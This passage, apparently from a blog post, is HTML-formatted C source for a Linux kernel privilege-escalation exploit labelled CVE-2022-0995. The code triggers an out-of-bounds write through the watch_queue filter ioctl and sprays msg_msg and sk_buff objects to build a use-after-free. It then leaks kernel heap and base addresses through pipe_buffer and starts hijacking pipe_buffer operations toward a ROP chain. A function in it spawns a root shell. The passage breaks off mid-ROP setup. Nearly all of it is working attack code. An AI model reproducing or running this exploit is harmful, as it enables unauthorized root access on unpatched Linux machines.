ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigerOutOfBoundWrite</span><span class="params">(<span class="type">int</span> pipe_fd[<span class="number">2</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nfilters;</span><br><span class="line">    </span><br><span class="line">    nfilters = <span class="number">4</span>;</span><br><span class="line">    wfilter = (<span class="keyword">struct</span> watch_notification_filter*)</span><br><span class="line">            <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> watch_notification_filter)</span><br><span class="line">                + nfilters * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> watch_notification_type_filter));</span><br><span class="line">    wfilter-&gt;nr_filters = nfilters;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// normal filter</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (nfilters - <span class="number">1</span>); i++)</span><br><span class="line">        wfilter-&gt;filters[i].type = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// evil filter</span></span><br><span class="line">    <span class="comment">// 0x300 = 64 * 12, 12 * 8 = 96bytes</span></span><br><span class="line">    <span class="comment">// 1 &lt;&lt; 0xa = 1024, maybe we can hit a proper bit</span></span><br><span class="line">    wfilter-&gt;filters[nfilters - <span class="number">1</span>].type = <span class="number">0x30a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger oob write</span></span><br><span class="line">    <span class="keyword">if</span> (ioctl(pipe_fd[<span class="number">0</span>], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prevent memory leak in userspace(no need in fact)</span></span><br><span class="line">    <span class="built_in">free</span>(wfilter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] CVE-2022-0995 Linux Privilege Escalation.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pipe to trigert off-by-null</span></span><br><span class="line">    <span class="keyword">if</span> (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create O_NOTIFICATION_PIPE!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create hole in primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger off-by-null on primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);</span><br><span class="line">    trigerOutOfBoundWrite(oob_pipe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the queues that have the same secondary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);</span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">1024</span>) == <span class="number">0</span>)  <span class="comment">// the hole</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error qid: %d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, </span><br><span class="line">            victim_qid, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, </span><br><span class="line">                        pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            kernel_base, kernel_offset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.V</span></span><br><span class="line"><span class="comment">     * hijack the ops of pipe_buffer</span></span><br><span class="line"><span class="comment">     * free all pipe to trigger fake ptr</span></span><br><span class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;</span><br><span class="line">    ops_ptr-&gt;release = <span class="number">0xffffffff8183b4d3</span> + kernel_offset;<span 